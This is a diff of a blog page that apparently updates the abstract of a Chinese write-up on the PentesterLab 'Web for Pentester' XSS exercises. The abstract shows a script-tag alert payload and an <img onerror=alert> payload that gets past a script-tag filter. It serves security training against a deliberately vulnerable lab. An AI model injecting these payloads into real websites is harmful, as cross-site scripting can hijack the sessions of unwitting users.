@@ -354,10 +354,15 @@
             Example 1很简单，没有任何过滤
 1name=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
 
-Example 2可以看到这里过滤了 ``` 12345![](e2-1.png)发现图片标签没过滤，构造
-?name=&lt;img onerror=alert(/xss/) src &gt;12345![](e2-2.png)# Example 3构造
-?name=&lt;img onerror=alert(/xss/) src &gt;1234567和2一样# Example 4![](e4-1.png)还是用
-?name=&...
+Example 2可以看到这里过滤了 script 标签
+发现图片标签没过滤，构造1?name=&lt;img onerror=alert(/xss/) src &gt;
+
+Example 3构造1?name=&lt;img onerror=alert(/xss/) src &gt;
+和2一样
+Example 4
+还是用1?name=&lt;img onerror=alert(/xss/) src &gt;
+
+Example 5有点...
         </div>
         <div class="abstract-post-meta">
             <!-- date  -->
@@ -519,8 +524,6 @@ https://www.pentesterlab.com/exercises/web_for_pentester/attachments
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
     
     
     
